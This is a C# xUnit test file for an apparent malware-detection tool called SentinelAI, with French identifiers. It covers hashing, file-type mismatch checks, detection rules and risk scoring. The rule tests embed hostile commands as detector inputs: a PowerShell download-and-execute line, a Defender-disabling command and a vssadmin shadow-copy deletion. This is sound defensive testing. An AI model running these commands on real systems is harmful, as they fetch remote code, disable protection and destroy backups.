using System.Text;
using SentinelAI.Core.Analysis;
using SentinelAI.Core.Models;
using SentinelAI.Core.Rules;
using SentinelAI.Core.Scoring;
using Xunit;

namespace SentinelAI.Core.Tests;

public class EmpreinteTests
{
    [Fact]
    public async Task Sha256_correspond_au_vecteur_connu()
    {
        using var bac = new BacASable();
        var chemin = bac.Ecrire("abc.txt", "abc");

        var empreinte = await new FileHasher().Sha256Async(chemin);

        Assert.Equal("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", empreinte);
    }

    [Fact]
    public async Task Sha256_d_un_fichier_vide()
    {
        using var bac = new BacASable();
        var chemin = bac.Ecrire("vide.txt", "");

        var empreinte = await new FileHasher().Sha256Async(chemin);

        Assert.Equal("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", empreinte);
    }
}

public class TypeDeFichierTests
{
    private readonly FileTypeInspector _inspecteur = new();

    [Theory]
    [InlineData(".exe", true)]
    [InlineData(".dll", true)]
    [InlineData(".msi", true)]
    [InlineData(".ps1", true)]
    [InlineData(".bat", true)]
    [InlineData(".cmd", true)]
    [InlineData(".js", true)]
    [InlineData(".vbs", true)]
    [InlineData(".txt", false)]
    [InlineData(".jpg", false)]
    public void Les_types_demandes_en_v01_sont_sensibles(string extension, bool attendu)
    {
        Assert.Equal(attendu, FileTypeInspector.EstSensible("fichier" + extension));
    }

    [Fact]
    public void Un_pe_renomme_en_txt_est_signale_et_reclasse()
    {
        var entete = new byte[] { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00 };

        var verdict = _inspecteur.Inspecter("facture.txt", entete);

        Assert.True(verdict.Incoherence);
        Assert.Equal("PE", verdict.TypeReel);
        Assert.Equal(FileCategory.Executable, verdict.Categorie);
        Assert.True(verdict.Sensible);
    }

    [Fact]
    public void Un_exe_authentique_ne_declenche_pas_d_incoherence()
    {
        var entete = new byte[] { 0x4D, 0x5A, 0x90, 0x00 };

        var verdict = _inspecteur.Inspecter("outil.exe", entete);

        Assert.False(verdict.Incoherence);
        Assert.Equal(FileCategory.Executable, verdict.Categorie);
    }

    [Fact]
    public void Un_msix_est_un_zip_sans_incoherence()
    {
        var entete = new byte[] { (byte)'P', (byte)'K', 0x03, 0x04 };

        var verdict = _inspecteur.Inspecter("application.msix", entete);

        Assert.False(verdict.Incoherence);
        Assert.Equal(FileCategory.Installeur, verdict.Categorie);
    }

    [Fact]
    public void Un_script_powershell_est_reconnu_comme_texte()
    {
        var entete = Encoding.UTF8.GetBytes("Write-Host 'bonjour'\r\n");

        var verdict = _inspecteur.Inspecter("script.ps1", entete);

        Assert.False(verdict.Incoherence);
        Assert.Equal(FileCategory.Script, verdict.Categorie);
        Assert.Equal("Script/texte", verdict.TypeReel);
    }
}

public class RegleTests
{
    private readonly RuleEngine _moteur = new(RuleEngine.ChargerIntegrees());

    [Fact]
    public void Les_regles_integrees_se_chargent()
    {
        Assert.True(_moteur.Nombre >= 25);
        Assert.All(_moteur.Regles, regle => Assert.False(string.IsNullOrWhiteSpace(regle.Id)));
    }

    [Fact]
    public void Les_identifiants_de_regles_sont_uniques()
    {
        var doublons = _moteur.Regles
            .GroupBy(r => r.Id, StringComparer.OrdinalIgnoreCase)
            .Where(g => g.Count() > 1)
            .Select(g => g.Key)
            .ToList();

        Assert.Empty(doublons);
    }

    [Fact]
    public void Toutes_les_expressions_regulieres_compilent()
    {
        foreach (var regle in _moteur.Regles)
        {
            var compiles = regle.Compiler();
            Assert.Equal(regle.Motifs.Length, compiles.Length);
        }
    }

    [Fact]
    public void Un_telechargement_suivi_d_une_execution_est_detecte()
    {
        const string script = "$c = New-Object Net.WebClient; IEX $c.DownloadString('http://exemple.test/a.ps1')";

        var indicateurs = _moteur.Evaluer(script, FileCategory.Script, ".ps1");

        Assert.Contains(indicateurs, i => i.Id == "PS-NET-001");
    }

    [Fact]
    public void La_desactivation_de_defender_est_detectee()
    {
        const string script = "Set-MpPreference -DisableRealtimeMonitoring $true";

        var indicateurs = _moteur.Evaluer(script, FileCategory.Script, ".ps1");

        Assert.Contains(indicateurs, i => i.Id == "DEF-TAMP-001");
    }

    [Fact]
    public void La_suppression_des_cliches_est_detectee()
    {
        const string script = "vssadmin delete shadows /all /quiet";

        var indicateurs = _moteur.Evaluer(script, FileCategory.Script, ".bat");

        Assert.Contains(indicateurs, i => i.Id == "RANSOM-001");
    }

    [Fact]
    public void Un_script_administratif_ordinaire_ne_declenche_rien()
    {
        const string script = """
            # Sauvegarde du dossier Documents
            $source = "$env:USERPROFILE\Documents"
            $cible = "D:\Sauvegardes"
            Copy-Item -Path $source -Destination $cible -Recurse -Force
            Write-Host "Sauvegarde terminée."
            """;

        var indicateurs = _moteur.Evaluer(script, FileCategory.Script, ".ps1");

        Assert.Empty(indicateurs);
    }

    [Fact]
    public void Une_regle_a_deux_motifs_requis_ne_se_declenche_pas_sur_un_seul()
    {
        const string script = "$octets = [Convert]::FromBase64String($donnees)";

        var indicateurs = _moteur.Evaluer(script, FileCategory.Script, ".ps1");

        Assert.DoesNotContain(indicateurs, i => i.Id == "PS-OBF-002");
    }

    [Fact]
    public void Une_regle_ciblant_les_scripts_ne_s_applique_pas_aux_documents()
    {
        const string texte = "eval(quelquechose); new Function('x');";

        var indicateurs = _moteur.Evaluer(texte, FileCategory.Document, ".pdf");

        Assert.DoesNotContain(indicateurs, i => i.Id == "JS-001");
    }
}

public class StructureTests
{
    [Theory]
    [InlineData("facture.pdf.exe", true)]
    [InlineData("photo.jpg.scr", true)]
    [InlineData("rapport.pdf", false)]
    [InlineData("outil.exe", false)]
    public void La_double_extension_est_detectee(string nom, bool attendu)
    {
        var resultat = StructuralAnalyzer.DetecterDoubleExtension(nom);

        Assert.Equal(attendu, resultat is not null);
    }

    [Fact]
    public void Un_executable_en_dossier_temporaire_est_signale()
    {
        using var bac = new BacASable();
        var chemin = bac.EcrireOctets(Path.Combine("Temp", "outil.exe"), [0x4D, 0x5A, 0x90, 0x00]);
        var fichier = new FileInfo(chemin);
        var verdict = new FileTypeInspector().Inspecter(chemin, File.ReadAllBytes(chemin));

        var indicateurs = new StructuralAnalyzer().Analyser(fichier, verdict);

        Assert.Contains(indicateurs, i => i.Id == "STR-EMP-001");
    }
}

public class ScoreTests
{
    private readonly RiskScorer _notation = new();

    [Fact]
    public void Sans_indicateur_un_fichier_ordinaire_est_sain()
    {
        var evaluation = _notation.Evaluer([], SignatureInfo.NonApplicable(), typeSensible: false);

        Assert.Equal(0, evaluation.Score);
        Assert.Equal(RiskLevel.Sain, evaluation.Niveau);
    }

    [Fact]
    public void Une_signature_valide_reduit_le_score()
    {
        RuleHit[] indicateurs =
        [
            new() { Id = "T-1", Nom = "Test", Poids = 30 }
        ];

        var signee = _notation.Evaluer(indicateurs,
            new SignatureInfo { Status = SignatureStatus.Valide, Signataire = "Éditeur" }, typeSensible: true);
        var nonSignee = _notation.Evaluer(indicateurs,
            new SignatureInfo { Status = SignatureStatus.NonSigne }, typeSensible: true);

        Assert.True(signee.Score < nonSignee.Score);
        Assert.Equal(5, signee.Score);
        Assert.Equal(48, nonSignee.Score);
    }

    [Fact]
    public void Une_signature_invalide_pese_lourd()
    {
        var evaluation = _notation.Evaluer([],
            new SignatureInfo { Status = SignatureStatus.Invalide }, typeSensible: true);

        Assert.Equal(40, evaluation.Score);
        Assert.Equal(RiskLevel.Moyen, evaluation.Niveau);
    }

    [Fact]
    public void Le_score_reste_borne_entre_0_et_100()
    {
        RuleHit[] lourds =
        [
            new() { Id = "A", Nom = "A", Poids = 55 },
            new() { Id = "B", Nom = "B", Poids = 50 },
            new() { Id = "C", Nom = "C", Poids = 45 }
        ];

        var haut = _notation.Evaluer(lourds, SignatureInfo.NonApplicable(), typeSensible: true);
        var bas = _notation.Evaluer([],
            new SignatureInfo { Status = SignatureStatus.Valide }, typeSensible: true);

        Assert.Equal(100, haut.Score);
        Assert.Equal(0, bas.Score);
    }

    [Fact]
    public void Une_empreinte_repertoriee_force_le_niveau_critique()
    {
        RuleHit[] indicateurs =
        [
            new() { Id = "HASH-001", Nom = "Empreinte connue", Poids = 100, Source = HitSource.Empreinte }
        ];

        // Meme avec une signature valide, qui vaut normalement -25.
        var evaluation = _notation.Evaluer(indicateurs,
            new SignatureInfo { Status = SignatureStatus.Valide }, typeSensible: true);

        Assert.Equal(100, evaluation.Score);
        Assert.Equal(RiskLevel.Critique, evaluation.Niveau);
    }

    [Fact]
    public void Chaque_indicateur_produit_une_explication()
    {
        RuleHit[] indicateurs =
        [
            new() { Id = "T-1", Nom = "Premier", Description = "Explication du premier", Poids = 20 },
            new() { Id = "T-2", Nom = "Second", Description = "Explication du second", Poids = 15 }
        ];

        var evaluation = _notation.Evaluer(indicateurs, SignatureInfo.NonApplicable(), typeSensible: false);

        Assert.Contains(evaluation.Explications, e => e.Contains("Premier"));
        Assert.Contains(evaluation.Explications, e => e.Contains("Second"));
        Assert.Contains(evaluation.Explications, e => e.Contains("35/100"));
    }

    [Theory]
    [InlineData(0, RiskLevel.Sain)]
    [InlineData(9, RiskLevel.Sain)]
    [InlineData(10, RiskLevel.Faible)]
    [InlineData(30, RiskLevel.Moyen)]
    [InlineData(55, RiskLevel.Eleve)]
    [InlineData(80, RiskLevel.Critique)]
    [InlineData(100, RiskLevel.Critique)]
    public void Les_seuils_de_niveau_sont_respectes(int score, RiskLevel attendu)
    {
        Assert.Equal(attendu, RiskScorer.NiveauPour(score));
    }
}

public class ExtractionTexteTests
{
    [Fact]
    public void Le_texte_d_un_script_est_conserve_tel_quel()
    {
        var contenu = Encoding.UTF8.GetBytes("Invoke-Expression $charge");

        var texte = TextExtractor.Extraire(contenu);

        Assert.Contains("Invoke-Expression", texte);
    }

    [Fact]
    public void Les_chaines_lisibles_sont_extraites_d_un_binaire()
    {
        var binaire = new List<byte> { 0x4D, 0x5A, 0x90, 0x00, 0x00, 0x00 };
        binaire.AddRange(Encoding.ASCII.GetBytes("VirtualAllocEx"));
        binaire.AddRange([0x00, 0x01, 0x02]);
        binaire.AddRange(Encoding.ASCII.GetBytes("WriteProcessMemory"));

        var texte = TextExtractor.Extraire([.. binaire]);

        Assert.Contains("VirtualAllocEx", texte);
        Assert.Contains("WriteProcessMemory", texte);
    }

    [Fact]
    public void Les_chaines_utf16_des_binaires_windows_sont_extraites()
    {
        var binaire = new List<byte> { 0x4D, 0x5A, 0x00, 0x00 };
        binaire.AddRange(Encoding.Unicode.GetBytes("powershell.exe -nop"));

        var texte = TextExtractor.Extraire([.. binaire]);

        Assert.Contains("powershell.exe -nop", texte);
    }
}
